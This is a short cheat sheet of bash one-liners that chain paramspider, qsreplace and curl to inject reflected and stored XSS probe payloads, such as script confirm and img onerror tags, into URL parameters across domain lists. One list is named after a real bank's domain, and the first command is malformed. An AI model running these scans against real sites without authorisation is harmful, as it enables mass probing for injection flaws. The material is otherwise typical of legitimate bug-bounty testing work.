
## XSS Detection with Paramspider

### Command 1:

```
paramspider -d test.com | tee yy.json | qsreplace '><script>confirm(1)</script>' | while read host; do (curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)") && echo "" && echo "$host" | \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
```

### Command 2:

```bash
paramspider -d test.com --placeholder '"><script>confirm(0)</scripT>'
```

### Command 3:

```bash
cat axisbank.com.txt | while read host; do (curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)") && echo -e "\033[0;31mVulnerable\033[0m $host" || echo -e "\033[0;32mNot Vulnerable\033[0m $host"; done
```

### Command 4:

```bash
while read -r domain; do paramspider -d "$domain" --placeholder '"><script>confirm(0)</scripT>'; done < domains.txt
```

## Notification Sender

### Command 1:

```bash
cat test.com.txt | while read host; do (curl --silent --path-as-is --insecure "$host" | grep -qs '"><script>confirm(0)</scripT>') && { echo -e "\033[0;31mVulnerable\033[0m $host" && notify-send "Vulnerable Link" "URL: $host"; } || echo -e "\033[0;32mNot Vulnerable\033[0m $host"; done
```

### Xss finder and Direct webiste  opener where xss is :

```bash
cat testphp.vulnweb.com.txt | while read host; do (curl --silent --path-as-is --insecure "$host" | grep -qs '"><script>confirm(0)</scripT>') && { echo -e "\033[0;31mVulnerable\033[0m $host" && notify-send "Vulnerable Link" "URL: $host" && xdg-open "$host"; } || echo -e "\033[0;32mNot Vulnerable\033[0m $host"; done
```

## Stored XSS Detection

### Command 7:

```bash
cat testphp.vulnweb.com.txt | while read host; do (curl --silent --path-as-is --insecure "$host" | grep -qs '"><img/src/onerror=prompt(0)>' && echo -e "\033[0;31mVulnerable\033[0m $host" && xdg-open "$host") || echo -e "\033[0;32mNot Vulnerable\033[0m $host"; done
```
```
